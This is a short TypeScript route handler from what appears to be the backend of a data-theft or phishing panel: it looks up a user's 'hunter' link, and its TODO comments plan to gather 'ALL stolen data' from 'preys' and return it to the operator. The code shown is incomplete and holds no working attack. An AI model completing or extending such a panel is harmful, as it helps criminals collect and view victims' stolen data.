import { RouterContext } from "deps";
import MongoService from "../services/mongodb_services.ts"
import JwtService from "../services/jwt_service.ts"

const preys = async ({ response, cookies }: RouterContext<"/preys">) => {

    const mongoService = new MongoService();
    const jwtService = new JwtService();

    const { _id }: any = await jwtService.verify(cookies);

    const databaseInformation = await mongoService.findUser("id", _id);

    const hunter = JSON.parse(JSON.stringify(databaseInformation)).hunter;

    
    //TODO: a function that uses hunter to get the prey link
    //TODO: a function that uses prey link yo agregate ALL stolen data
    //TODO: return that data to the frontend

  const _response = {
    success: true,
    message: {
        "your id is:": _id,
        "your hunter link is:": hunter
    }

  };
  response.body = JSON.stringify(_response);
};

export default preys;